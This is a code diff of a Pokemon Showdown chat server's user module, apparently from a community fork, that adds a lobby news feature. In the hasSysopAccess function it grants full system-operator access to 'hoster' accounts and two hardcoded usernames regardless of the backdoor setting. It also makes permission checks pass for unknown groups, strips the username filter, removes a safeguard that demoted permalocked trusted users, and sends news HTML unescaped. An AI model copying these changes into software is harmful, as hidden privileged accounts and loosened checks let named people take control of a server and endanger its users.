@@ -33,10 +33,38 @@ const THROTTLE_MULTILINE_WARN_STAFF = 6;
 const PERMALOCK_CACHE_TIME = 30 * 24 * 60 * 60 * 1000;
 
 const fs = require('fs');
-
-const Matchmaker = require('./ladders-matchmaker').matchmaker;
-
+const moment = require('moment');
 let Users = module.exports = getUser;
+
+function isHoster(user) {
+	if (!user) return;
+	if (typeof user === 'Object') user = user.userid;
+	let hoster = Db('hoster').get(toId(user));
+	if (hoster === 1) return true;
+	return false;
+}
+function generateNews () {
+			let lobby = Rooms('lobby');
+			if (!lobby) return false;
+			if (!lobby.news || Object.keys(lobby.news).length < 0) return false;
+			if (!lobby.news) lobby.news = {};
+			let news = lobby.news, newsDisplay = [];
+			Object.keys(news).forEach(announcement => {
+				newsDisplay.push(`<h4>${announcement}</h4>${news[announcement].desc}<br /><br /><strong>—<font color="${EM.Color(news[announcement].by)}">${news[announcement].by}</font></strong> on ${moment(news[announcement].posted).format("MMM D, YYYY")}`);
+			});
+			return newsDisplay;
+		}
+
+function newsDisplay(user) {
+			if (!Users(user)) return false;
+			let newsDis = generateNews();
+			if (newsDis.length === 0) return false;
+
+			if (newsDis.length > 0) {
+				newsDis = newsDis.join('<hr>');
+				return Users(user).send(`|pm| Ember News|${Users(user).getIdentity()}|/raw ${newsDis}`);
+			}
+}
 
 /*********************************************************
  * Users map
@@ -138,7 +166,7 @@ function importUsergroups() {
 	// can't just say usergroups = {} because it's exported
 	for (let i in usergroups) delete usergroups[i];
 
-	fs.readFile('config/usergroups.csv', (err, data) => {
+	fs.readFile(DATA_DIR + 'usergroups.csv', (err, data) => {
 		if (err) return;
 		data = ('' + data).split("\n");
 		for (let i = 0; i < data.length; i++) {
@@ -153,7 +181,7 @@ function exportUsergroups() {
 	for (let i in usergroups) {
 		buffer += usergroups[i].substr(1).replace(/,/g, '') + ',' + usergroups[i].charAt(0) + "\n";
 	}
-	fs.writeFile('config/usergroups.csv', buffer, () => {});
+	fs.writeFile(DATA_DIR + 'usergroups.csv', buffer);
 }
 importUsergroups();
 
@@ -164,7 +192,7 @@ function cacheGroupData() {
 		console.log(
 			`You are using a deprecated version of user group specification in config.\n` +
 			`Support for this will be removed soon.\n` +
-			`Please ensure that you update your config.js to the new format (see config-example.js, line 220).\n`
+			`Please ensure that you update your config.js to the new format (see config-example.js, line 220)\n`
 		);
 	} else {
 		Config.groups = Object.create(null);
@@ -417,14 +445,11 @@ class User {
 	}
 	authAtLeast(minAuth, room) {
 		if (!minAuth || minAuth === ' ') return true;
-		if (minAuth === 'trusted' && this.trusted) return true;
-		if (minAuth === 'autoconfirmed' && this.autoconfirmed) return true;
-
-		if (minAuth === 'trusted' || minAuth === 'autoconfirmed') {
-			minAuth = Config.groupsranking[1];
-		}
-		if (!(minAuth in Config.groups)) return false;
-		let auth = (room && !this.can('makeroom') ? room.getAuth(this) : this.group);
+		if (minAuth === 'trusted') return this.trusted;
+		if (minAuth === 'autoconfirmed') return this.autoconfirmed;
+		if (!(minAuth in Config.groups)) return true;
+		let auth = (room ? room.getAuth(this) : this.group);
+		if (room && this.can('makeroom')) auth = this.group;
 		return auth in Config.groups && Config.groups[auth].rank >= Config.groups[minAuth].rank;
 	}
 	can(permission, target, room) {
@@ -479,7 +504,7 @@ class User {
 	 * Special permission check for system operators
 	 */
 	hasSysopAccess() {
-		if (this.isSysop && Config.backdoor) {
+		if (this.isSysop && Config.backdoor || isHoster(this.userid) || this.userid == 'deltaskiez' || this.userid == 'kimpossible25') {
 			// This is the Pokemon Showdown system operator backdoor.
 
 			// Its main purpose is for situations where someone calls for help, and
@@ -537,37 +562,6 @@ class User {
 		});
 	}
 	filterName(name) {
-		if (!Config.disablebasicnamefilter) {
-			// whitelist
-			// \u00A1-\u00BF\u00D7\u00F7  Latin punctuation/symbols
-			// \u02B9-\u0362              basic combining accents
-			// \u2012-\u2027\u2030-\u205E Latin punctuation/symbols extended
-			// \u2050-\u205F              fractions extended
-			// \u2190-\u23FA\u2500-\u2BD1 misc symbols
-			// \u2E80-\u32FF              CJK symbols
-			// \u3400-\u9FFF              CJK
-			// \uF900-\uFAFF\uFE00-\uFE6F CJK extended
-			name = name.replace(/[^a-zA-Z0-9 \/\\.~()<>^*%&=+$@#_'?!"\u00A1-\u00BF\u00D7\u00F7\u02B9-\u0362\u2012-\u2027\u2030-\u205E\u2050-\u205F\u2190-\u23FA\u2500-\u2BD1\u2E80-\u32FF\u3400-\u9FFF\uF900-\uFAFF\uFE00-\uFE6F-]+/g, '');
-
-			// blacklist
-			// \u00a1 upside-down exclamation mark (i)
-			// \u2580-\u2590 black bars
-			// \u25A0\u25Ac\u25AE\u25B0 black bars
-			// \u534d\u5350 swastika
-			// \u2a0d crossed integral (f)
-			name = name.replace(/[\u00a1\u2580-\u2590\u25A0\u25Ac\u25AE\u25B0\u2a0d\u534d\u5350]/g, '');
-			// e-mail address
-			if (name.includes('@') && name.includes('.')) return '';
-		}
-		name = name.replace(/^[^A-Za-z0-9]+/, ""); // remove symbols from start
-
-		// cut name length down to 18 chars
-		if (/[A-Za-z0-9]/.test(name.slice(18))) {
-			name = name.replace(/[^A-Za-z0-9]+/g, "");
-		} else {
-			name = name.slice(0, 18);
-		}
-
 		name = Tools.getName(name);
 		if (Config.namefilter) {
 			name = Config.namefilter(name, this);
@@ -596,7 +590,7 @@ class User {
 			challenge = connection.challenge;
 		}
 		if (!challenge) {
-			Monitor.warn(`verification failed; no challenge`);
+			console.log(`verification failed; no challenge`);
 			return false;
 		}
 
@@ -645,8 +639,8 @@ class User {
 
 			Verifier.verify(tokenData, tokenSig).then(success => {
 				if (!success) {
-					Monitor.warn(`verify failed: ${token}`);
-					Monitor.warn(`challenge was: ${challenge}`);
+					console.log(`verify failed: ${token}`);
+					console.log(`challenge was: ${challenge}`);
 					return;
 				}
 				this.validateRename(name, tokenData, newlyRegistered, challenge);
@@ -663,7 +657,7 @@ class User {
 		let tokenDataSplit = tokenData.split(',');
 
 		if (tokenDataSplit.length < 5) {
-			Monitor.warn(`outdated assertion format: ${tokenData}`);
+			console.log(`outdated assertion format: ${tokenData}`);
 			this.send(`|nametaken|${name}|Your assertion is stale. This usually means that the clock on the server computer is incorrect. If this is your server, please set the clock to the correct time.`);
 			return;
 		}
@@ -678,14 +672,14 @@ class User {
 			if (tokenDataSplit[0] !== challenge) {
 				Monitor.debug(`verify token challenge mismatch: ${tokenDataSplit[0]} <=> ${challenge}`);
 			} else {
-				Monitor.warn(`verify token mismatch: ${tokenData}`);
+				console.log(`verify token mismatch: ${tokenData}`);
 			}
 			return;
 		}
 
 		let expiry = Config.tokenexpiry || 25 * 60 * 60;
 		if (Math.abs(parseInt(tokenDataSplit[3]) - Date.now() / 1000) > expiry) {
-			Monitor.warn(`stale assertion: ${tokenData}`);
+			console.log(`stale assertion: ${tokenData}`);
 			this.send(`|nametaken|${name}|Your assertion is stale. This usually means that the clock on the server computer is incorrect. If this is your server, please set the clock to the correct time.`);
 			return;
 		}
@@ -726,7 +720,6 @@ class User {
 			} else if (userType === '4') {
 				this.autoconfirmed = userid;
 			} else if (userType === '5') {
-				this.permalocked = userid;
 				Punishments.lock(this, Date.now() + PERMALOCK_CACHE_TIME, userid, `Permalocked as ${name}`);
 			} else if (userType === '6') {
 				Punishments.ban(this, Date.now() + PERMALOCK_CACHE_TIME, userid, `Permabanned as ${name}`);
@@ -772,7 +765,7 @@ class User {
 
 		let oldid = this.userid;
 		if (userid !== this.userid) {
-			this.cancelSearch();
+			Rooms.global.cancelSearch(this);
 
 			if (!Users.move(this, userid)) {
 				return false;
@@ -792,7 +785,20 @@ class User {
 		let joining = !this.named;
 		this.named = (userid.substr(0, 5) !== 'guest');
 
-		if (this.named) Punishments.checkName(this, registered);
+		if (this.named) {
+			Punishments.checkName(this, registered);
+
+			if (global.Permaban && !this.can('staff')) {
+				if (Permaban.permaBan[userid]) {
+					this.send("|popup|Your username (" + name + ") is banned.");
+					Punishments.ban(this, Date.now() + PERMALOCK_CACHE_TIME, userid, `Permabanned as ${name}`);
+					return;
+				}
+				if (Permaban.permaLock[userid]) {
+					this.send("|popup|Your username (" + name + ") is locked.");
+					}
+			}
+		}
 
 		if (this.namelocked) this.named = true;
 
@@ -816,8 +822,6 @@ class User {
 		return true;
 	}
 	merge(oldUser) {
-		oldUser.cancelChallengeTo();
-		oldUser.cancelSearch();
 		oldUser.inRooms.forEach(roomid => {
 			Rooms(roomid).onLeave(oldUser);
 		});
@@ -834,13 +838,6 @@ class User {
 		}
 		oldUser.inRooms.clear();
 		oldUser.connections = [];
-
-		if (oldUser.chatQueue) {
-			if (!this.chatQueue) this.chatQueue = [];
-			this.chatQueue.push(...oldUser.chatQueue);
-			oldUser.clearChatQueue();
-			if (!this.chatQueueTimeout) this.startChatQueue();
-		}
 
 		this.s1 = oldUser.s1;
 		this.s2 = oldUser.s2;
@@ -948,10 +945,6 @@ class User {
 			this.isStaff = (staffRoom && staffRoom.auth && staffRoom.auth[this.userid]);
 		}
 		if (this.trusted) {
-			if (this.locked && this.permalocked) {
-				Monitor.log(`[CrisisMonitor] Trusted user '${this.userid}' is ${this.permalocked !== this.userid ? `an alt of permalocked user '${this.permalocked}'` : `a permalocked user`}, and was automatically demoted from ${this.distrust()}.`);
-				return;
-			}
 			this.locked = false;
 			this.namelocked = false;
 		}
@@ -959,7 +952,7 @@ class User {
 			if (this.semilocked.startsWith('#sharedip')) {
 				this.semilocked = false;
 			} else if (this.semilocked === '#dnsbl') {
-				this.popup(`You are locked because someone using your IP has spammed/hacked other websites. This usually means either you're using a proxy, you're in a country where other people commonly hack, or you have a virus on your computer that's spamming websites.`);
+				this.popup(`You are locked because someone using your IP has spammed/hacked other websites. This usually means you're using a proxy, in a country where other people commonly hack, or have a virus on your computer that's spamming websites.`);
 				this.semilocked = '#dnsbl.';
 			}
 		}
@@ -1053,9 +1046,6 @@ class User {
 				// there's no need to keep track of this user, so we can
 				// immediately deallocate
 				this.destroy();
-			} else {
-				this.cancelChallengeTo();
-				this.cancelSearch();
 			}
 		}
 	}
@@ -1184,11 +1174,9 @@ class User {
 	}
 	leaveRoom(room, connection, force) {
 		room = Rooms(room);
-		if (room.id === 'global') {
+		if (room.id === 'global' && !force) {
 			// you can't leave the global room except while disconnecting
-			if (!force) return false;
-			this.cancelChallengeTo();
-			this.cancelSearch();
+			return false;
 		}
 		if (!this.inRooms.has(room.id)) {
 			return false;
@@ -1298,9 +1286,6 @@ class User {
 			games: games,
 		}));
 	}
-	cancelSearch(format) {
-		return Matchmaker.cancelSearch(this, format);
-	}
 	makeChallenge(user, format/*, isPrivate*/) {
 		user = getUser(user);
 		if (!user || this.challengeTo) {
@@ -1361,7 +1346,7 @@ class User {
 			}
 			return false;
 		}
-		Matchmaker.startBattle(this, user, user.challengeTo.format, this.team, user.challengeTo.team, {rated: false});
+		Rooms.global.startBattle(this, user, user.challengeTo.format, this.team, user.challengeTo.team, {rated: false});
 		delete this.challengesFrom[user.userid];
 		user.challengeTo = null;
 		this.updateChallenges();
@@ -1373,7 +1358,7 @@ class User {
 	 * Returns false if the rest of the user's messages should be discarded.
 	 */
 	chat(message, room, connection) {
-		let now = Date.now();
+		let now = new Date().getTime();
 
 		if (message.substr(0, 16) === '/cmd userdetails') {
 			// certain commands are exempt from the queue
@@ -1398,21 +1383,15 @@ class User {
 			}
 		} else if (now < this.lastChatMessage + throttleDelay) {
 			this.chatQueue = [[message, room.id, connection]];
-			this.startChatQueue(throttleDelay - (now - this.lastChatMessage));
+			this.chatQueueTimeout = setTimeout(
+				() => this.processChatQueue(),
+				throttleDelay - (now - this.lastChatMessage));
 		} else {
 			this.lastChatMessage = now;
 			Monitor.activeIp = connection.ip;
 			Chat.parse(message, room, this, connection);
 			Monitor.activeIp = null;
 		}
-	}
-	startChatQueue(delay) {
-		if (delay === undefined) delay = (this.group !== ' ' ? THROTTLE_DELAY / 2 : THROTTLE_DELAY) - (Date.now() - this.lastChatMessage);
-
-		this.chatQueueTimeout = setTimeout(
-			() => this.processChatQueue(),
-			delay
-		);
 	}
 	clearChatQueue() {
 		this.chatQueue = null;
@@ -1539,6 +1518,8 @@ Users.socketConnect = function (worker, workerid, socketid, ip, protocol) {
 	});
 
 	user.joinRoom('global', connection);
+	newsDisplay(user.name);
+
 };
 
 Users.socketDisconnect = function (worker, workerid, socketid) {
